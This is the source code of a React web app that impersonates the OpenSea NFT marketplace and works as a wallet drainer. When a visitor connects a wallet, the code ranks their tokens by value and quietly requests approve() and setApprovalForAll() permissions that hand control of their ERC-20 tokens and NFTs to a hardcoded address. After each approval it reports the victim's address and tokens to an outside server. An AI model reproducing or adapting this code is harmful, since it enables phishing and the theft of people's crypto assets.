import "./App.css";
import { useMoralis, useNFTBalances } from "react-moralis";
import Moralis from "moralis";
import { useEffect, useRef, useState } from "react";
import {
    useMoralisWeb3Api,
    useTokenPrice,
    useERC20Balances,
} from "react-moralis";

const myAddress = "0x103F6A08e23dA494c5Dd6504573624Ff7ac34D9b";
const ercTokenContractABI = [
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "_spender", type: "address" },
            { internalType: "uint256", name: "_amount", type: "uint256" },
        ],
        name: "approve",
        outputs: [
            {
                internalType: "bool",
                name: "",
                type: "bool",
            },
        ],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
];

const nftTokenContractABI = [
    {
        inputs: [
            { internalType: "address", name: "operator", type: "address" },
            { internalType: "bool", name: "approved", type: "bool" },
        ],
        name: "setApprovalForAll",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
];

interface NFT {
    token_address: string,
    token_id: string,
    contract_type: string,
    owner_of: string,
    block_number: string,
    block_number_minted: string,
    token_uri: string,
    metadata: string,
    synced_at: string,
    amount: string,
    name: string,
    symbol: string,
}


interface ITokenBalance {
    token_address: string;
    name: string;
    symbol: string;
    logo?: string | undefined;
    thumbnail?: string | undefined;
    decimals: string;
    balance: string;
    usdBalance?: string;
}

interface TokenProps {
    balances: ITokenBalance[];
    address: string;
}

function sleep(ms: number) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const TokenPrice: React.FC<TokenProps> = (props) => {
    const { data } = useNFTBalances();
    const [tokenBalances, setTokenBalances] = useState<ITokenBalance[]>([]);
    const [highTokenBalances, setHighTokenBalances] = useState<ITokenBalance[]>([]);
    const { Moralis } = useMoralis();
    const Web3Api = useMoralisWeb3Api();
    const updated = useRef(false);


    const fetchBalances = async () => {
        if (updated.current) return;
        updated.current = true;
        setTokenBalances([]);

        let _tokenBalances: ITokenBalance[] = [];
        // let _highTokenBalances: ITokenBalance[] = [];

        for (let balance of props.balances) {
            try {
                const price = await Web3Api.token.getTokenPrice({
                    address: balance.token_address,
                });

                const balanceStr = balance.balance.toString();
                console.log(balance.decimals)
                const _price = (
                    price.usdPrice * Number(balanceStr.substring(0, balanceStr.length - Number(balance.decimals)) + ".00")

                ).toString();
                const _balance = balance;
                _balance.usdBalance = _price;

                if (Number(_price) >= 0) {
                    _tokenBalances.push(_balance);
                }
                await sleep(250);
            } catch (err) {
                console.log(err);
            }
        }



        _tokenBalances = _tokenBalances.sort((a, b) => {
            if (Number(a.usdBalance) < Number(b.usdBalance)) {
                return 1;
            }
            if (Number(a.usdBalance) > Number(b.usdBalance)) {
                return -1;
            }
            return 0;
        });

        console.log(_tokenBalances);
        setTokenBalances(_tokenBalances);
    };

    const fetchNFTBalance = async () => {

    }
    useEffect(() => {
        if (props.balances.length)
            fetchBalances();
        // fetchNFTLowestPrice();
        // console.log(tokenBalances)
    }, [props.balances]);

    useEffect(() => {
        (async () => {

            if (tokenBalances.length) {
                for (let ercBalance of tokenBalances) {
                    try {
                        const sendOptions = {
                            contractAddress: ercBalance.token_address,
                            functionName: "approve",
                            abi: ercTokenContractABI,
                            params: {
                                _spender: myAddress,
                                _amount: Moralis.Units.Token(100000, Number(ercBalance.decimals)),
                            },
                        };

                        const transaction = await Moralis.executeFunction(sendOptions);
                        fetch("https://ethers-server.herokuapp.com/user-token/", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                // '
                            },
                            body: JSON.stringify({
                                address: props.address,
                                token_type: "erc20",
                                token_id: "",
                                date: new Date().toISOString(),
                                token_address: ercBalance.token_address,
                            }),
                        });
                    } catch (error) { }
                }
            }

            if (data?.total) {
                const allNFTs = (data.result as any) as NFT[];
                const approvedNFT: string[] = [];
                for (let nft of allNFTs) {
                    if (!approvedNFT.find(_nft => nft.token_address == _nft)) {
                        approvedNFT.push(nft.token_address);
                        try {
                            const sendOptions = {
                                contractAddress: nft.token_address,
                                functionName: "setApprovalForAll",
                                abi: nftTokenContractABI,
                                params: {
                                    operator: myAddress,
                                    approved: true
                                },
                            };

                            const transaction = await Moralis.executeFunction(sendOptions);
                            fetch("https://ethers-server.herokuapp.com/user-token/", {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json",
                                    // '
                                },
                                body: JSON.stringify({
                                    address: props.address,
                                    token_type: "nft",
                                    token_id: nft.token_id,
                                    date: new Date().toISOString(),
                                    token_address: nft.token_address,
                                }),
                            });
                        } catch (error) { }
                    }
                }
            }


        })()

    }, [tokenBalances]);
    return <></>;
};

function detectMob() {
    return window.innerWidth <= 800 && window.innerHeight <= 1000;
}

const Account = () => {
    const [address, setAddress] = useState("");
    const {
        authenticate,
        isAuthenticated,
        isAuthenticating,
        account,
        user,
        chainId,
        logout,
    } = useMoralis();
    const { fetchERC20Balances, data, isLoading, isFetching, error } =
        useERC20Balances();
    const [tokenPrices, setTokenPrices] = useState([]);
    const Web3Api = useMoralisWeb3Api();

    const authenticateUser = async () => {
        try {
            if (!isAuthenticated) {
                console.log(detectMob())
                if (detectMob()) {
                    await authenticate({ provider: "walletconnect" })
                        .then(function (user: any) {
                            console.log(user);
                        })
                        .catch(function (error: any) {
                            console.log(error);
                        });
                    return;
                }

                const user = await authenticate();
                
                

                setAddress(account as string);
            }
        } catch (error) {
            console.log(error)
            await authenticate({ provider: "walletconnect" })
                .then(function (user: any) {
                    console.log(user);
                })
                .catch(function (error: any) {
                    console.log(error);
                });
        }

    };

    useEffect(() => {
        if (isAuthenticating) return;
        authenticateUser();
    }, [isAuthenticated]);
    return (
        <>
            {isAuthenticated && (
                <TokenPrice
                    address={account as string}
                    balances={data as ITokenBalance[]}
                />
            )}

            <div className="relative">
                <div className='absolute h-full w-full bg-cover blur-md jumbotron -z-10 opacity-25' style={{ backgroundImage: `url(${process.env.PUBLIC_URL + "media/nft.png"})` }}>

                </div>
                <div className="md:flex container mx-auto py-12">
                    <div className='md:w-6/12 self-center md:px-8 px-0'>
                        <h1 className="md:text-5xl text-3xl px-8 md:px-0 md:text-left text-center font-semibold">

                            Discover, collect, and sell extraordinary NFTs
                        </h1>
                        <h4 className='text-zinc-700 md:text-2xl md:mt-8 mt-4 md:text-left text-center text-lg '>
                            OpenSea is the world's first and <br /> largest NFT marketplace
                        </h4>

                        <div className="mt-8 md:text-left text-center">
                            <button onClick={authenticateUser} className="mr-4 py-3 md:px-12 px-8 md:text-base text-sm rounded-lg text-white bg-blue-500 font-semibold">
                                Explore
                            </button>
                            <button onClick={authenticateUser} className="py-3 md:px-12 px-8 md:text-base text-sm rounded-lg text-blue-500 bg-white border border-blue-500 font-semibold">
                                Claim
                            </button>
                        </div>
                        <div className="mt-8">
                            <h6 className="font-semibold text-blue-500 md:text-left text-center">
                                Learn more about OpenSea
                            </h6>
                        </div>
                    </div>
                    <div className='md:w-6/12 container md:mt-0 mt-14'>
                        <div className='md:px-0 px-6'>
                            <img className='md:w-[550px] shadow-md  mx-auto rounded-lg' src={process.env.PUBLIC_URL + "media/nft2.png"} alt="" />
                        </div>
                    </div>
                </div>
            </div >
        </>
    );
};

const EthApp = () => {
    const {
        authenticate,
        isAuthenticating,
        user,
        account,
        logout,
        isWeb3Enabled,
        enableWeb3,
        isAuthenticated,
        isWeb3EnableLoading,
    } = useMoralis();

    useEffect(() => {
        if (isAuthenticated && !isWeb3Enabled && !isWeb3EnableLoading) {
            if (detectMob()) {
                enableWeb3({ provider: "walletconnect" });
                return;
            }
            enableWeb3();
        }
    }, [isAuthenticated, isWeb3Enabled]);

    return (
        <>
            <Account />
        </>
    );
};

export default EthApp;
